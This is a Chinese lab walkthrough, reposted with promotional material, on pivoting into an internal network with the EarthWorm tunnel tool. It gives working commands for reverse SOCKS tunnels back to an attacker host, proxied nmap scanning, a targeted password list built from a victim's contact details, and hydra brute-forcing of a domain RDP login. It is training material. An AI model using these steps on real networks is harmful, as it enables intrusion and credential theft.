> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493486&idx=1&sn=ff2d6c728350d40d24c192736d74950a

#  【内网渗透】EarthWorm隧道代理  
YueXuan  神农Sec   2025-07-18 01:00  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
文章作者：YueXuan  
  
文章来源：https://www.freebuf.com/articles/system/438053.html  
  
  
**EarthWorm隧道代理**  
  
  
## 【实验目的】  
  
通过在Windows服务器和Linux服务器使用EarthWorm隧道代理，进行横向扫描内网。  
## 【知识点】  
  
EarthWorm隧道代理  
## 【实验原理】  
  
EarthWorm（ew）是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，可在复杂网络环境下完成网络穿透。工具包中提供了多种可执行文件，以适用Linux、Windows、MacOS、Arm-Linux 等不同的操作系统。  
## 【软件工具】  
- 服务器：Windows Server 2008 1台；防火墙 1台；Kali Linux台；Centos 7 1台；Windows 10 1台；Windows 2016 1台；  
  
- 交换机/路由：交换机 4台；路由器 1台；  
  
- 软件：EarthWorm；  
  
## 【实验拓扑】  
  
![17060609723976169847850070196534dc228f9e6](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVebeOG1OPSziaL2IUiaeFNMPZM6ecwreUd5joeDzFmuK6CRnicbZPO9icibQ/640?wx_fmt=jpeg&from=appmsg "")  
## 【实验预期】  
  
1.在Windows做反向隧道代理进行横向渗透。  
2.在Linux做反向隧道代理进行横向渗透。  
3.搜索关于内网主机的相关信息并爆破口令。  
## 【实验步骤】  
### 1.信息收集  
  
**（1）登录攻击机1-kali Linux**  
  
单击上方菜单栏中的【环境申请】按钮启动实验拓扑，选择拓扑图中左上方的【攻击机1-kali Linux】，按右键，在弹出的菜单中选择【控制台】，输入用户名密码root/com.1234，登录【攻击机1-kali Linux】界面，如下图所示。  
  
![17060609723976169847850070196534dc228f9e6](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVebeOG1OPSziaL2IUiaeFNMPZM6ecwreUd5joeDzFmuK6CRnicbZPO9icibQ/640?wx_fmt=jpeg&from=appmsg "")  
  
右键桌面，弹出的菜单栏中选择【Open Terminal Here】，打开操作机终端，如下图所示。  
  
![17056301339311658bd26638dd1](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVsJdAuoibSQn6xszQVDsPcGwHaYJ8VtFTxV83Ug9HrFp08RJGKjy892w/640?wx_fmt=jpeg&from=appmsg "")  
  
输入以下命令并按回车，使用rdesktop命令远程目标服务器，并开启Kali Linux本机的共享目录，共享目录在根目录下的tools文件夹，最后使用800x600的分辨率，如下图所示。  

```
rdesktop -u test -p Admin@123. 202.1.10.34 -r disk:h=/tools -g 800x600

```

  
![image-20240703130923260](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV92L2J60zMUdmZqaUicfWdDFXrRhFHx9iadEV80BNuS6zRIgwMVs3gsGg/640?wx_fmt=jpeg&from=appmsg "")  
> 注：由第六单元的子任务6.1.1添加用户，用户名为【test】，密码为【Admin@123.】。  
  
  
当显示【Do you trust this certificate （yes/no）?】，输入yes并按回车，弹出目标服务器的远程桌面窗口，等待用户相关配置，至到进入桌面，如下图所示。  
  
![image-20240703130450833](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVv2T7tna9ANROj8TTeiaP2OTognUSXQYiaxCSLFiafVEwicblhznoABfsDg/640?wx_fmt=jpeg&from=appmsg "")  
  
关闭该窗口，再次输入以下命令并按回车，如下图所示。  

```
rdesktop -u test -p Admin@123. 202.1.10.34 -r disk:h=/tools -g 800x600

```

  
![image-20240703130851789](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVzEtWP4YoWM8w09KWOFykcLpcoz4VPn32O5sw9ibNicGtRQs70Ns2s4Uw/640?wx_fmt=jpeg&from=appmsg "")  
> 注：此步骤重新刷新kali linux 共享到目标主机的连接。  
  
  
**（2）发现10.0.18.22地址**  
  
单击任务栏上的【Windows 资源管理器】，依次双击【计算机】→【本地磁盘 C】，发现10.0.18.22快捷链接，双击【10.0.18.22】图标的文件，由此可发现10.0.18.22是个可疑的地址，如下图所示。  
  
![image-20240703131007645](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aViaYdJFicCmCo7baSYxtOntGSD0elfEKq9u4KlaoL14EUwNYyuh611zRQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![image-20240703131047598](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVEuYgDYpexxhsTfB4JW96IZydzqsyAL3T8P0UqM8YHUxKQ2ltO3DRDA/640?wx_fmt=jpeg&from=appmsg "")  
  
在桌面shift+右键，弹出菜单后选择【在此处打开命令提示符】，如下图所示。  
  
![image-20240703131126540](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVNH0RpwKTmSWghKs7XkfnbLQMQwUicbl9s0fcVXc8v4wicU5bq6MnuA1g/640?wx_fmt=jpeg&from=appmsg "")  
  
使用ping命令尝试去ping这个内网地址，结果发现是可以ping通，该设备是存活的状态，如下图所示。  
  
![image-20240703131206008](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVnQKYaxSPbAeFicsglLvslr9P2sReQMJu0G2iaZJXLB2ley2PibdqUiaoiag/640?wx_fmt=jpeg&from=appmsg "")  
> 注：由于10.0.18.22是内网地址，外部攻击机无法直接去连接该内网地址，需通过隧道代理，代理到攻击机，才可进行下一步的渗透。  
  
### 2.Windows隧道代理  
  
**（1）本地1080与8080做端口转发**  
  
回到【攻击机1-kali Linux】界面，再次新建终端输入以下命令并按回车，使用EarthWorm工具开启socks5代理由本地端口1080与8080做端口转发，如下图所示。  

```
/tools/ew -s rcsocks -l 1080 -e 8080 &

```

  
![image-20240703131646006](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVMgkOPIFliaMeh5IOQOeP2PZHa3pLIQTSCCKSlWXZjUYWuOnsTiaBTI5A/640?wx_fmt=jpeg&from=appmsg "")  
  
使用vim命令创建并编辑/etc/proxychians4.conf文件，如下图所示。  
  
![image-20240703131836914](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVyamqSEkC2Z5Ef2LSATvJr7YY66rptXk1vpmuZ2Q2iaQIEibD7wkIee8g/640?wx_fmt=jpeg&from=appmsg "")  
  
按【i】键启用编辑模式，查看proxychians4.conf文件末尾处是否为socks5代理本地127.0.0.1的1080端口，如下图所示。  
  
![image-20240703131753259](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVMDaibSQ1436yVEOXBHAMQ5TLiceUSvCh3a45f2tSCASe39knUfs27JtQ/640?wx_fmt=jpeg&from=appmsg "")  
  
编辑完成后，按下【Esc】键，退出编辑模式，输入 【:wq!】 命令并按下回车键，保存并退出文件编辑模式，如下图所示。  
  
![image-20240703131904357](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV4fmwq1f8MCWRM8S6zkscessCWuBQTncSib5nZJVMXDC199SHERPhlWA/640?wx_fmt=jpeg&from=appmsg "")  
  
**（2）上传EarthWorm的Windows版**  
  
回到远程桌面窗口，依次双击【计算机】→【kali上的h系统文件夹】，进入Kali Linux本机的共享目录，并复制【ew.exe】到桌面，如下图所示。  
  
****  
**（3）执行反向代理**  
  
再次新建命令提示符窗口，输入以下命令并按回车，使用EarthWorm工具做socks代理连接攻击机1-kali Linux的端口8080，如下图所示。  

```
ew  -s rssocks -d 67.220.91.30 -e 8080

```

  
****  
**（4）通过隧道代理使用NMAP扫描内网地址**  
  
回到【攻击机1-kali Linux】界面，新建终端输入以下命令并按回车，使用proxychians代理nmap工具绕过防火墙ICMP限制，并扫描指定范围的端口，如下图所示。  

```
proxychains nmap -Pn -sT -p 21,22,23,25,80，135,139,445,3306,3389 10.0.18.22

```

  
![image-20240703132512416](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVM17XURmAvXup3oibN571TiczPeJCkLP7jD6lUeeh8Co0T3amJR6k39Jg/640?wx_fmt=jpeg&from=appmsg "")  
> 注：需等待几分钟，因隧道代理减缓了nmap的扫描速度。  
-Pn=指定绕过防防火墙，解除禁Ping  
-sT=指定对TCP进行端口扫描  
-p=指定端口范围  
  
  
得出结果10.0.18.22存在端口有139、139、445三个端口，如下图所示。  
  
![image-20240703132553911](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVvkwWia0GpShrswdqzswVAuAkalYNS8LxU15Zo60ETdqAFCcVWmphgvg/640?wx_fmt=jpeg&from=appmsg "")  
### 3.Linux隧道代理  
  
**（1）本地1088与8088做端口转发**  
  
输入以下命令并按回车，使用EarthWorm工具开启socks5代理由本地端口1088与8088做端口转发，如下图所示。  

```
/tools/ew -s rcsocks -l 1088 -e 8088 &

```

  
![image-20240703132812613](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVQxWiam9LDkDkTZOYDZIBKQv0sXvqXgbJcobWcDFRf2XjU09R0vhk3cA/640?wx_fmt=jpeg&from=appmsg "")  
  
使用vim命令创建并编辑/etc/proxychians4.conf文件，如下图所示。  
  
![image-20240703131836914](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVyamqSEkC2Z5Ef2LSATvJr7YY66rptXk1vpmuZ2Q2iaQIEibD7wkIee8g/640?wx_fmt=jpeg&from=appmsg "")  
  
按【i】键启用编辑模式，在proxychians4.conf文件末尾处修改以下内容，使用socks5代理本地127.0.0.1的1088端口，如下图所示。  

```
socks5 127.0.0.1 1088

```

  
![image-20240703132931651](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV7PJSnd0BpnQMJK6qqCQLRoNHabrIHdmAIgibWGkoI3hxlSOqnLUiaw9Q/640?wx_fmt=jpeg&from=appmsg "")  
  
编辑完成后，按下【Esc】键，退出编辑模式，输入 【:wq!】 命令并按下回车键，保存并退出文件编辑模式，如下图所示。  
  
![image-20240703131904357](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV4fmwq1f8MCWRM8S6zkscessCWuBQTncSib5nZJVMXDC199SHERPhlWA/640?wx_fmt=jpeg&from=appmsg "")  
  
**（2）上传EarthWorm的Linux版**  
  
新建Linux终端，输入以下命令并按回车，使用scp命令由根目录下的
```
tools
```

  
文件夹的ew文件至使用202.1.10.57的/bin目录，同时使用如下图所示。  

```
scp /tools/ew test@202.1.10.57:/bin

```

  
![image-20240703133132704](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVxKaVRYbLA8azRljHDFpHZDU4pGHW6IVauUYvlhaib4vVovT2vLeaA1A/640?wx_fmt=jpeg&from=appmsg "")  
> 注：由第六单元的6.2子任务，利用SUID方式提权添加test用户为root权限，密码为Com.1234。  
  
  
输入以下命令并按下回车，远程连接目标服务器的SSH，202.1.10.57服务器ssh用户名为【test】，密码为【Com.1234】。如下图所示。  

```
ssh test@202.1.10.57

```

  
![image-20240703133232880](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVgmo8ruYCIbRZMmFydsANia7xkIpCBdpuIRhkc8ZTpOPxBlrH0licWehQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**（3）执行反向代理**  
  
输入以下命令并按下回车，使用chmod命令给予/bin目录下的ew文件执行权限，同时使用EarthWorm工具做socks代理连接攻击机1-kali Linux的端口8088，如下图所示。  

```
ew  -s rssocks -d 67.220.91.30 -e 8088

```

  
![image-20240703133337239](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVVP9ND0bk7HnyYtE4HVbUAHZ9iarN3iaicSpMkEOEZicMMESanyXz95fSpg/640?wx_fmt=jpeg&from=appmsg "")  
  
**（4）通过隧道代理使用NMAP扫描内网地址**  
  
新建终端输入以下命令并按回车，使用proxychians代理nmap工具绕过防火墙ICMP限制，并扫描指定范围的端口，如下图所示。  

```
proxychains nmap -Pn -sT -p 21,22,23,25,80，135,139,445,3306,3389 10.0.18.22

```

  
![image-20240703133634292](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVNfFrUH5nzr8acBpWpSzRxib3BL6BOG5TImDicV0sYRnQrwZ04BicCgenA/640?wx_fmt=jpeg&from=appmsg "")  
> 注：需等待几分钟，因隧道代理减缓了nmap的扫描速度。  
-Pn=指定绕过防防火墙，解除禁Ping  
-sT=指定对TCP进行端口扫描  
-p=指定端口范围  
  
  
得出结果10.0.18.22存在端口有139、139、445、3389四个端口，比windows多个3389端口，推测windows server限制由DMZ区访问内网的3389端口，而Linux server则未做该限制，如下图所示。  
  
![image-20240703134803510](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVtcm1yBdnkpp7v29vHl2ia8tW0RXZt62xDeDwcP6GOU3efVC72mN1zAw/640?wx_fmt=jpeg&from=appmsg "")  
  
输入以下命令并按回车，使用proxychians代理rdesktop远程10.0.18.22，验证是否可正常访问RDP服务，如下图所示。  

```
proxychains rdesktop 10.0.18.22

```

  
![image-20240703134912996](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVeiaEW50bKvPjZuia8Rxv1gCWNEOX5yCG2bLcia28N6dDj2LOjsvUVWK0A/640?wx_fmt=jpeg&from=appmsg "")  
  
当显示【Do you trust this certificate （yes/no）?】，显示证书信息发现该内网主机为域用户，域名为【zhida.com】，计算机名为【jishu】，使用ctrl+z结束远程，如下图所示。  
  
![image-20240703135026843](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVdWAEANL8LggFjqjD1sH5PaJvXFfXdwMACjz50Bx1Ru6qtd8w6oB5lg/640?wx_fmt=jpeg&from=appmsg "")  
> 注：因不知域用户的账户和密码，需要继续进行信息搜索。  
  
  
回到远程桌面窗口，在桌面新建命令提示符，进入命令提示符窗口后，输入以下命令并按回车，使用cd命令，进入administrator的桌面，如下图所示。  

```
cd C:\Users\Administrator\Desktop

```

  
![image-20240703135712110](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV6TdxV2ick4HDX6AF3EYQNmlo2XVtqTNS9p8RKx4AboImQneaiaDBrOJA/640?wx_fmt=jpeg&from=appmsg "")  
  
分别输入dir和【dir /a】命令并按回车，分别查看administrator桌面的文件，当使用【dir /a】命令时发现一个隐藏文件【xiaowang.conntact.lnk】，如下图所示。  
  
![image-20240703135747525](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV1Mj67e2gzJ3Rs1wcEaUiaV59GKr1FRT355r7XzPaOOklrc48DEcbnzw/640?wx_fmt=jpeg&from=appmsg "")  
> 注：dir /a为显示隐藏文件。  
  
  
输入以下命令并按回车，使用xcopy命令，复制当前目录下的【xiaowang.contact.lnk】文件到test桌面下，如下图所示。  

```
xcopy /h xiaowang.contact.lnk C:\Users\test\Desktop\ 

```

  
![image-20240703135905526](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVotH9mzg24nRb1jVicqqgUlZyS5sOu0pFT1GIsootuEwgTJSHFJUfNwQ/640?wx_fmt=jpeg&from=appmsg "")  
> 注：xcopy /h 复制具有隐藏文件和系统文件属性的文件。  
  
  
在test用户下的桌面，再次新建命令提示符，输入以下命令并按回车，使用attrib命令去除【xiaowang.contact.lnk】文件隐藏属性，如下图所示。  

```
attrib -h xiaowang.contact.lnk

```

  
![image-20240703140115384](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV8WYCv3Te5OicbF221RG2g35iaCXMmbnpXnicxhiaDbiavLuvy8fuiapnuibWA/640?wx_fmt=jpeg&from=appmsg "")  
> 注：使用attrib命令的-h参数指定文件去除文件隐藏属性。  
  
  
双击打开【xiaowang.contact.lnk】文件，发现内容为运维测试人员的相关信息，如运维测试人员所属公司、姓名【xiaowang】、所属职务、电子邮箱为【xiaowang@zhida.com】和电话【8046732】，如下图所示。  
  
![image-20240703140157202](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVhNTlsD5qNbJmD2Yt1XZzWL7eOtWVKtyX8GZe3Fn0b2icM2Iib2Z9vPaw/640?wx_fmt=jpeg&from=appmsg "")  
  
单击【姓名和电子邮件】选项卡，除上述相关信息外，发现其中昵称可能为员工号【A0107】，如下图所示。  
  
![image-20240703140253227](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVn5u1CHoK8ia13EVFaQE68XTaT9kD7icxQ4MVPGFdHbkjIAYLUHNiaErzw/640?wx_fmt=jpeg&from=appmsg "")  
  
单击【工作】选项卡，该内容为运维测试人员的所属办公室【302】、所属部门【技术部】，其中所属部门【技术部】与发现远程连接10.0.18.22显示证书信息的计算机名为【jishu】相同，如下图所示。  
  
![image-20240703140355037](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVmuHM21e9pJtwErutxtooehXfQTHVnkPFmw0WmVSqhxiaUzIBIxpMicew/640?wx_fmt=jpeg&from=appmsg "")  
> 注：猜测10.0.18.22内网机器可能为xiaowang用户。  
  
  
准备字典内容，回到Linux终端输入以下命令并按下回车键，使用vim命令创建并编辑TestConn.php文件，如下图所示。  

```
vim password.txt

```

  
![image-20240703140448263](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV21UsXGt8yPnFmRDNCGomvlB65Oukv5JkeWfxumuesSRsJvv9rKAB8Q/640?wx_fmt=jpeg&from=appmsg "")  
  
对password.txt文件进行编辑添加相应的密码字典，按【i】键启用编辑模式，并输入以下密码组合，尝试对上述运维测试人员信息进行密码字典组合，如下图所示。  

```
xiaowang
xiaowang@zhida.com
8046732
A0107
302
jishu
xiaowangjishubu
xiaowangA0107
xwA0107
XiaoWangZhida
xwzhida
Xiaowangzhida
Xwzhida
xiaowang@A0107.
Xw@A0107.

```

  
![image-20240703140528768](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVufdwINGlMDwaPOBm8551nMl8KYY7UVH9OElSuibHhiaMnBEn5z3brOrA/640?wx_fmt=jpeg&from=appmsg "")  
> 注：尝试进行密码组合，如：员工号+电话、姓名大小全拼+邮箱、姓名+集团名等等。  
  
  
编辑完成后，按下【Esc】键，退出编辑模式，输入 【:wq!】 命令并按下回车键，保存并退出文件编辑模式，如下图所示。  
  
![image-20240703131904357](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV4fmwq1f8MCWRM8S6zkscessCWuBQTncSib5nZJVMXDC199SHERPhlWA/640?wx_fmt=jpeg&from=appmsg "")  
  
输入以下命令并按回车，使用hydra工具进行暴力破解10.0.18.22的rdp，尝试使用域账户【xiaowang@zhida.com】去暴力破解域用户的密码，如下图所示。  

```
proxychains hydra -l xiaowang@zhida.com -P password.txt   10.0.18.22 rdp

```

  
![image-20240703140957243](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aV9fjgSRT68CBaR2qZY4rZ0hScxHwaMnpibcsLiaG39aMuucrYa4t4MvHg/640?wx_fmt=jpeg&from=appmsg "")  
  
爆破后的结果为域账户【xiaowang@zhida.com】，域密码为【Xw@A0107.】，如下图所示。  
  
![image-20240703141010449](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVZsbDz7Dpya0eVW9ulDlcaIdza4OXGndia4y7QtoakGCGWxjj2NzOJyQ/640?wx_fmt=jpeg&from=appmsg "")  
  
输入以下命令并按回车，为了验证所爆破出的管理员口令是否正确，使用proxychians代理rdesktop远程10.0.18.22，如下图所示。  

```
proxychains rdesktop -u xiaowang@zhida.com -p Xw@A0107. 10.0.18.22 -g 800x600

```

  
![image-20240703141408246](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVr0eERxa1Yzfl09oGmtjPg26ict2cyMbtCa2ba4xzW7oeHacictLC7slA/640?wx_fmt=jpeg&from=appmsg "")  
  
当显示【Do you trust this certificate （yes/no）?】，输入yes并按回车，弹出目标服务器的远程桌面窗口，等待用户相关配置，至到进入桌面，同时发现该主机为域用户，域名为zhida.com，如下图所示。  
  
![1706060978125816984785014381653625c9a38c1 (1)](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVwmQ7PnF4E7AxUqImlYqapyHUaGVibicmIicBKS9ZkevpFxng6dclibQiceg/640?wx_fmt=jpeg&from=appmsg "")  
  
发现可成功远程目标机器，如下图所示。  
  
![image-20240703141447474](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXdl8nia4BicSevibNs0mk13aVUs4ibmeKhdB9EUow7bA4p3AmM0C9VXrcs9Ex0payF84cheSCXgibZ9TQ/640?wx_fmt=jpeg&from=appmsg "")  
## 【实验结论】  
  
通过上述操作，分别通过在Windows服务器和Linux服务器使用隧道代理，进行横向扫描内网，爆破口令目标机器得出域账户和密码，了解并掌握如何使用EarthWorm隧道代理工具。  
  
  
**内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```

  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于1000人 45元/年  
  
星球人数少于1200人 65元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKogHTNRKIZQVcM0QQE3wbFrFciafzrEaRcia7gkRFb4vujBubqic3sPIN1g/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满1000人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
